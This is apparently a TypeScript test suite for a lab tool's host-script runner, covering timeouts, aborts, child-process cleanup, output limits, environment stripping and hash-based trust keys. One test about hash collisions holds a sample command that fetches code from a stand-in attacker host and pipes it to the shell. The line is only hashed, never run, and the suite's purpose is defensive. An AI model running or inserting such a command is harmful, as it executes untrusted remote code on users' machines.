import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readdirSync, readFileSync } from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test, { type TestContext } from "node:test";
import { setTimeout as sleep } from "node:timers/promises";

import { MAX_INLINE_SCRIPT_BYTES } from "@containerlab/clab-ui/host";

import { collectHostScript } from "../contract/hostScripts.ts";
import { describeLocalHostScript, runLocalHostScript, streamLocalHostScript } from "./hostScripts.ts";
import { resolveLocalOptions } from "./options.ts";

async function labFolder(t: TestContext): Promise<string> {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), "lab-backend-scripts-"));
  t.after(() => fs.rm(directory, { recursive: true, force: true }));
  return directory;
}

/** A sleep nothing else runs: the fraction marks it, so only this test's is found. */
function uniqueSleep(): string {
  return `sleep 30.${process.pid}${Math.floor(Math.random() * 1e6)}`;
}

/** The processes whose whole command line is `command`. */
function pidsOf(command: string): number[] {
  const wanted = `${command.replaceAll(" ", "\0")}\0`;
  const pids: number[] = [];
  for (const entry of readdirSync("/proc")) {
    if (!/^\d+$/.test(entry)) continue;
    try {
      if (readFileSync(`/proc/${entry}/cmdline`, "utf8") === wanted) pids.push(Number(entry));
    } catch {
      // The process just ended.
    }
  }
  return pids;
}

function isRunning(command: string): boolean {
  return pidsOf(command).length > 0;
}

function killAll(command: string): void {
  for (const pid of pidsOf(command)) process.kill(pid, "SIGKILL");
}

async function until(condition: () => boolean, timeoutMs = 3000): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (condition()) return true;
    await sleep(25);
  }
  return condition();
}

function sha256(text: string): string {
  return createHash("sha256").update(text).digest("hex");
}

test("an inline script runs in the topology folder and knows its lab", async (t) => {
  const folder = await labFolder(t);
  const topology = path.join(folder, "demo.clab.yml");
  await fs.writeFile(topology, "name: demo\n");
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo", topology },
    { script: 'printf "%s %s %s" "$PWD" "$CLAB_LAB_NAME" "$CLAB_TOPOLOGY"' }
  );
  assert.equal(result.exitCode, 0);
  assert.equal(result.stdout, `${await fs.realpath(folder)} demo ${topology}`);
});

test("a relative script path starts at the topology folder", async (t) => {
  const folder = await labFolder(t);
  await fs.mkdir(path.join(folder, "scripts"));
  await fs.writeFile(path.join(folder, "scripts", "hi.sh"), "echo from-file\nexit 3\n");
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo", topology: path.join(folder, "demo.clab.yml") },
    { scriptPath: "scripts/hi.sh" }
  );
  assert.equal(result.exitCode, 3);
  assert.equal(result.stdout, "from-file\n");
});

test("a missing script file is reported before anything runs", async (t) => {
  const folder = await labFolder(t);
  await assert.rejects(
    runLocalHostScript(
      resolveLocalOptions({ workspaceRoot: folder }),
      { labName: "demo", topology: path.join(folder, "demo.clab.yml") },
      { scriptPath: "missing.sh" }
    ),
    { status: 404 }
  );
});

test("a missing lab folder is named instead of blaming bash", async (t) => {
  const folder = await labFolder(t);
  const gone = path.join(folder, "gone");
  await assert.rejects(
    runLocalHostScript(
      resolveLocalOptions({ workspaceRoot: folder }),
      { labName: "demo", topology: path.join(gone, "demo.clab.yml") },
      { script: "echo hi" }
    ),
    (error: Error & { status?: number }) => {
      assert.equal(error.status, 404);
      assert.match(error.message, /gone/);
      assert.doesNotMatch(error.message, /bash/);
      return true;
    }
  );
});

test("a timeout stops the script and the children it started", async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const started = Date.now();
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: `${child}; echo late`, timeoutSeconds: 0.3 }
  );
  assert.equal(result.timedOut, true);
  assert.equal(result.exitCode, null);
  assert.ok(Date.now() - started < 3000, "the timeout waited for the child");
  assert.equal(await until(() => !isRunning(child)), true, "the child survived the timeout");
});

test("aborting stops a script that is quiet, and its children", async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const controller = new AbortController();
  const finished = collectHostScript(
    await streamLocalHostScript(
      resolveLocalOptions({ workspaceRoot: folder }),
      { labName: "demo" },
      { script: `${child}; echo late` },
      { signal: controller.signal }
    )
  );
  assert.equal(await until(() => isRunning(child)), true);
  const stoppedAt = Date.now();
  controller.abort();
  const result = await finished;
  assert.equal(result.cancelled, true);
  assert.ok(Date.now() - stoppedAt < 3000, "the abort waited for the child");
  assert.equal(await until(() => !isRunning(child)), true, "the child survived the abort");
});

test("aborting before the output is read still stops the script", async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const controller = new AbortController();
  await streamLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: `${child}; echo late` },
    { signal: controller.signal }
  );
  assert.equal(await until(() => isRunning(child)), true);
  controller.abort();
  assert.equal(await until(() => !isRunning(child)), true);
});

test("a script that ignores SIGTERM is killed", { timeout: 15_000 }, async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const controller = new AbortController();
  const finished = collectHostScript(
    await streamLocalHostScript(
      resolveLocalOptions({ workspaceRoot: folder }),
      { labName: "demo" },
      { script: `trap '' TERM; ${child}` },
      { signal: controller.signal }
    )
  );
  assert.equal(await until(() => isRunning(child)), true);
  controller.abort();
  await finished;
  assert.equal(await until(() => !isRunning(child), 8000), true, "SIGKILL never came");
});

test("breaking out of the stream stops the script and its children", async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const events = await streamLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: `echo ready; ${child}; echo late` }
  );
  for await (const event of events) {
    if (event.type === "output") break;
  }
  assert.equal(await until(() => !isRunning(child)), true, "the script kept running after the stream stopped");
});

test("a script that leaves a process behind finishes, and the process stays", async (t) => {
  const folder = await labFolder(t);
  const child = uniqueSleep();
  t.after(() => killAll(child));
  const started = Date.now();
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: `${child} & echo started; exit 0` }
  );
  assert.equal(result.exitCode, 0);
  assert.equal(result.stdout, "started\n");
  assert.ok(Date.now() - started < 3000, "the run waited for the background process");
  assert.equal(isRunning(child), true, "a normal exit must not kill what the script started");
});

test("output that comes just before the exit is kept", async (t) => {
  const folder = await labFolder(t);
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: "seq 1 20000" }
  );
  assert.equal(result.stdout.trimEnd().split("\n").at(-1), "20000");
});

test("a flood with a slow reader stays bounded", { timeout: 30_000 }, async (t) => {
  const folder = await labFolder(t);
  const controller = new AbortController();
  const events = await streamLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: 'yes "$(printf "x%.0s" $(seq 1 1000))"' },
    { signal: controller.signal }
  );
  const before = process.memoryUsage().rss;
  let received = 0;
  const deadline = Date.now() + 2000;
  for await (const event of events) {
    if (event.type !== "output") continue;
    received += event.text.length;
    // A reader far slower than the script.
    await sleep(5);
    if (Date.now() > deadline) break;
  }
  assert.ok(received > 0);
  const grownMiB = (process.memoryUsage().rss - before) / (1024 * 1024);
  assert.ok(grownMiB < 200, `memory grew by ${Math.round(grownMiB)} MiB`);
});

test("a flood without newlines reaches the reader", { timeout: 30_000 }, async (t) => {
  const folder = await labFolder(t);
  const result = await runLocalHostScript(
    resolveLocalOptions({ workspaceRoot: folder }),
    { labName: "demo" },
    { script: 'head -c 3000000 /dev/zero | tr "\\0" x', timeoutSeconds: 20 }
  );
  assert.equal(result.exitCode, 0);
  assert.match(result.stdout, /^\[output truncated/);
  assert.ok(result.stdout.length < 600 * 1024);
});

test("hosts that turn script buttons off refuse to run them", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder, hostScripts: false });
  await assert.rejects(runLocalHostScript(options, { labName: "demo" }, { script: "echo hi" }), { status: 501 });
  await assert.rejects(describeLocalHostScript(options, { labName: "demo" }, { script: "echo hi" }), { status: 501 });
});

test("c9s lab hosts never run scripts, whatever the setting says", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder, runtime: "c9s", hostScripts: true });
  assert.equal(options.hostScripts, false);
  await assert.rejects(runLocalHostScript(options, { labName: "demo" }, { script: "echo hi" }), {
    status: 501,
    message: /Kubernetes/
  });
});

test("inline scripts over the limit are refused, and the limit fits on a command line", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder });
  const fits = await runLocalHostScript(options, { labName: "demo" }, {
    script: `#${"x".repeat(MAX_INLINE_SCRIPT_BYTES - 1)}`
  });
  assert.equal(fits.exitCode, 0);
  await assert.rejects(
    runLocalHostScript(options, { labName: "demo" }, { script: `#${"x".repeat(MAX_INLINE_SCRIPT_BYTES)}` }),
    { status: 400 }
  );
});

test("timeouts outside the limits are refused", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder });
  for (const timeoutSeconds of [0, -1, Number.NaN, 24 * 60 * 60 + 1]) {
    await assert.rejects(
      runLocalHostScript(options, { labName: "demo" }, { script: "echo hi", timeoutSeconds }),
      { status: 400 }
    );
  }
});

test("scripts do not get the app's own settings", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({
    workspaceRoot: folder,
    env: { ...process.env, ELECTRON_RUN_AS_NODE: "1", WEB_LOCAL_LABS: "true", KEEP_ME: "yes" }
  });
  const result = await runLocalHostScript(options, { labName: "demo" }, {
    script: 'printf "%s|%s|%s" "${ELECTRON_RUN_AS_NODE:-}" "${WEB_LOCAL_LABS:-}" "${KEEP_ME:-}"'
  });
  assert.equal(result.stdout, "||yes");
});

test("a description names the file, its content and its hash", async (t) => {
  const folder = await labFolder(t);
  const topology = path.join(folder, "demo.clab.yml");
  await fs.writeFile(topology, "name: demo\n");
  await fs.writeFile(path.join(folder, "a.sh"), "echo a\n");
  const options = resolveLocalOptions({ workspaceRoot: folder });
  const description = await describeLocalHostScript(options, { labName: "demo", topology }, { scriptPath: "a.sh" });
  assert.equal(description.kind, "file");
  assert.equal(description.resolvedPath, path.join(folder, "a.sh"));
  assert.equal(description.content, "echo a\n");
  assert.equal(description.sha256, sha256("echo a\n"));
  assert.equal(description.foreign, false);
  assert.equal(description.truncated, false);
});

test("the trust key changes with the content, the topology and the file", async (t) => {
  const folder = await labFolder(t);
  const topology = path.join(folder, "demo.clab.yml");
  await fs.writeFile(topology, "name: demo\n");
  await fs.writeFile(path.join(folder, "a.sh"), "echo a\n");
  const options = resolveLocalOptions({ workspaceRoot: folder });
  const key = async (lab: { labName: string; topology: string }) =>
    (await describeLocalHostScript(options, lab, { scriptPath: path.join(folder, "a.sh") })).trustKey;

  const first = await key({ labName: "demo", topology });
  assert.equal(await key({ labName: "demo", topology }), first);
  assert.notEqual(await key({ labName: "demo", topology: path.join(folder, "other", "demo.clab.yml") }), first);
  await fs.writeFile(path.join(folder, "a.sh"), "echo changed\n");
  assert.notEqual(await key({ labName: "demo", topology }), first);
});

test("inputs that collide under the old 32-bit hash get different trust keys", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder });
  const lab = { labName: "demo" };
  const benign = await describeLocalHostScript(options, lab, { script: "echo status # zJ3o0Sopxo6YtI" });
  const evil = await describeLocalHostScript(options, lab, {
    script: "curl -s https://evil.example/x | sh # iqgm6ruJKOjHsU"
  });
  assert.notEqual(benign.trustKey, evil.trustKey);
});

test("a run refuses a script that changed since it was confirmed", async (t) => {
  const folder = await labFolder(t);
  const options = resolveLocalOptions({ workspaceRoot: folder });
  const topology = path.join(folder, "demo.clab.yml");
  const file = path.join(folder, "a.sh");
  await fs.writeFile(file, "echo first > ran\n");
  const { sha256: approved } = await describeLocalHostScript(options, { labName: "demo", topology }, { scriptPath: "a.sh" });

  await fs.writeFile(file, "echo second > ran\n");
  await assert.rejects(
    runLocalHostScript(options, { labName: "demo", topology }, { scriptPath: "a.sh", expectedSha256: approved }),
    { status: 409 }
  );
  await assert.rejects(fs.access(path.join(folder, "ran")));

  await assert.rejects(
    runLocalHostScript(options, { labName: "demo" }, { script: "echo other", expectedSha256: approved }),
    { status: 409 }
  );
});
